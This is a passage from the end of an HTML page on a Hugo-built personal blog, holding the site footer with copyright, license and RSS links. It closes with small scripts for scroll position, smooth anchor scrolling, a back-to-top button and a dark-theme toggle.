20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><div class=footer-wrapper><div class=footer-right><span class=copyright>&copy; 2024&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span></div><div class=footer-mid><span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span>
&nbsp;·&nbsp;
<span class=support><a href=https://fahmifj.github.io/about#support>support</a></span>
&nbsp;·&nbsp;
<span class=rss><a href=https://fahmifj.github.io/index.xml>rss</a></span></div><div class=footer-left><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span></div></div></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.getElementsByClassName("profile-img")[0].addEventListener("click",()=>{location.href=location.origin+"/about"})</script></body></html>